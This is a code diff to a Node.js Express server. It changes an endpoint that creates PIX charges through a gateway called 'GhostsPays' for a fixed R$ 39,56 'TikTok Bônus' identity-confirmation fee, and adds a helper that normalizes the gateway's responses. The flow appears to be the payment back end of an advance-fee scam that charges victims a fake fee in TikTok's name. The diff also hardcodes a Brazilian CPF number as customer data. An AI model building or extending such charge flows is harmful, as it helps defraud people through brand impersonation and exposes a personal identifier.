@@ -40,7 +40,26 @@ async function callGhostsPays(endpoint, options) {
   return { status: resp.status, body: json };
 }
 
-// Cria um pagamento PIX fixo para a taxa de confirmação (R$ 39,56) usando CPF 11238990533
+function normalizePixResponse(body) {
+  if (!body || typeof body !== 'object') return body;
+  const data = body.data || body;
+  const id = body.id ?? data.id ?? body.transactionId ?? data.transactionId;
+  const amount = body.amount ?? data.amount;
+  const status = body.status ?? data.status ?? 'waiting_payment';
+  const pixBlock = body.pix ?? data.pix ?? body.pixPayment ?? data.pixPayment ?? {};
+  const qrcode =
+    pixBlock.qrcode ?? pixBlock.qrCode ?? pixBlock.qrcodeImage ?? body.qrcode ?? data.qrcode ?? (typeof pixBlock.image === 'string' ? pixBlock.image : null);
+  const qrcodeText =
+    pixBlock.qrcodeText ?? pixBlock.copyPaste ?? pixBlock.brCode ?? pixBlock.pixKey ?? body.qrcodeText ?? body.brCode ?? data.qrcodeText ?? data.brCode ?? (typeof pixBlock.text === 'string' ? pixBlock.text : null);
+  return {
+    id,
+    amount,
+    status,
+    pix: { qrcode: qrcode || null, qrcodeText: qrcodeText || null }
+  };
+}
+
+// Cria um pagamento PIX fixo para a taxa de confirmação (R$ 39,56) — payload conforme doc GhostsPays
 app.post('/api/ghostspay/pix-taxa', async (req, res) => {
   if (!GHOSTSPAY_SECRET_KEY || !GHOSTSPAY_COMPANY_ID) {
     return res.status(500).json({
@@ -55,33 +74,22 @@ app.post('/api/ghostspay/pix-taxa', async (req, res) => {
   const amount = 3956; // R$ 39,56 em centavos
 
   const payload = {
+    amount,
+    paymentMethod: 'PIX',
+    description: 'Taxa de confirmação TikTok Bônus',
     customer: {
       name: 'CPF 112.389.905-33',
       email: 'cpf11238990533@example.com',
       phone: '11999999999',
-      document: {
-        number: cpfNumero,
-        type: 'CPF'
-      }
+      document: cpfNumero
     },
-    paymentMethod: 'PIX',
-    amount,
     items: [
       {
         title: 'Taxa de confirmação de identidade',
         unitPrice: amount,
         quantity: 1
       }
-    ],
-    pix: {
-      expiresInDays: 1
-    },
-    description: 'Taxa de confirmação TikTok Bônus',
-    metadata: {
-      flow: 'tiktok_bonus',
-      cpf: cpfNumero,
-      chavePix: cpfNumero
-    }
+    ]
   };
 
   if (GHOSTSPAY_POSTBACK_URL) {
@@ -98,6 +106,9 @@ app.post('/api/ghostspay/pix-taxa', async (req, res) => {
       body: JSON.stringify(payload)
     });
 
+    if (status >= 200 && status < 300) {
+      return res.status(status).json(normalizePixResponse(body));
+    }
     res.status(status).json(body);
   } catch (e) {
     console.error('[GhostsPays] Erro ao criar pagamento PIX:', e);
